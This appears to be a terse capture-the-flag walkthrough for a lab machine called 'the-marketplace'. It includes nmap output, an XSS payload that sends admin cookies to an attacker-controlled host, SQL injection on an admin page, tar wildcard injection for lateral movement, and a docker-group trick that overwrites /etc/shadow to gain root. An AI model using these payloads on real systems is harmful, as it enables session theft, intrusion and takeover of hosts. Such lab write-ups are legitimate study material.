nmap -sV -p- 10.10.149.193 

output :

22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
|_http-server-header: nginx/1.19.2
32768/tcp open  http    Node.js (Express middleware)

1-sign up in website
2-login
3-make New listing
4-title=<script>document.location='http://your ip/cookiestealer.php?c='+document.cookie;</script>
5-open webserver
6-steal cookie 
7-login with admin cookie
8-/target/admin?user=1 (SQL injection)
9- exploit SQLi



----------------------
table:
messages
in column:
message_content
user:jake
with password in column message_content
-connect with ssh 
-sudo -l
[+]output[+]
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
-----    
exploit:https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
-now we in user 
-michael
run linpeas 
UTC 2020oups: uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
  docker image run -it --volume /etc/shadow:/tmp/shadow alpine:latest sh  
  echo "root:$(mkpasswd -m sha-512 foo foobarbaz):12345:0:::::" > /tmp/shadow
  link exploit :https://blog.martiert.com/the-docker-group-and-privilege-escalation/
  now su root with your password
  we have root:)
  flags in:
    -admin panel
    -/home/jake/user.txt
    /root/root.txt








